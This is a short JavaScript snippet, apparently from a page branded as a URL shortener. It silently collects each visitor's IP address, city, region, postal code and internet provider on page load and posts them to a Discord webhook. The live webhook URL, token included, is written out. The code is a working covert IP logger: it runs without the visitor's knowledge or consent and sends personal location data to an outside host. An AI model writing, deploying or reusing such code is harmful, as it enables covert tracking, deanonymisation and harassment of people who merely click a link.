async function sendUserIPToWebhook() {
  // Fetching the IP data from the API
  const response = await fetch('https://ipapi.co/json/');
  const data = await response.json();

  // Check if the IP is IPv6, if yes, use the fallback IPv4 address
  const userIP = data.ip.includes(':') ? 'IPv6 detected, showing IPv4' : data.ip;

  // Creating the embed for the Webhook with just the IP
  const embed = {
    title: "New User Info",    // Embed title
    description: "IP Address collected from the website visit.",  // Embed description
    color: 0x32CD32,           // Embed color (green)
    fields: [
      { name: "IP Address", value: userIP, inline: true },
      { name: "City", value: data.city || 'N/A', inline: true },
      { name: "Region", value: data.region || 'N/A', inline: true },
      { name: "Country", value: data.country_name || 'N/A', inline: true },
      { name: "Postal Code", value: data.postal || 'N/A', inline: true },
      { name: "Provider/Organization", value: data.org || 'N/A', inline: true }
    ],
    footer: {
      text: "CD Hub - URL Shortener"
    }
  };

  // Replace with your actual Webhook URL
  const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo';

  // Sending the IP in the embed to the Discord webhook
  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ embeds: [embed] }),  // Sending the embed JSON
  });
}

// Wait for the page to load completely and then send the IP
window.onload = async () => {
  await sendUserIPToWebhook(); // Log to check if the request was successful
};
